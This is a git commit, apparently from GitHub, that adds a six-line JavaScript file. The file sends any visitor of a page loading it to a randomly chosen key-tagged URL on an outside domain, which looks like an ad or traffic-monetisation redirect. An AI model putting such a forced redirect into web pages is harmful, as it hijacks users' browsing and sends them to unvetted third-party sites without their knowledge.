ee386160070e808806d159d8c2c1c8e34863b7b0
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-06-10 16:20:30 +0800

    Create cpat.js

---
+++ cpat.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+  '//bismuni.com/aagxk1htg?key=8766e82913b6419a1c60a7bee47c86c2',
+  '//bismuni.com/fdk9pcwj?key=4879840d797239b77ace3ec695694e0f'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
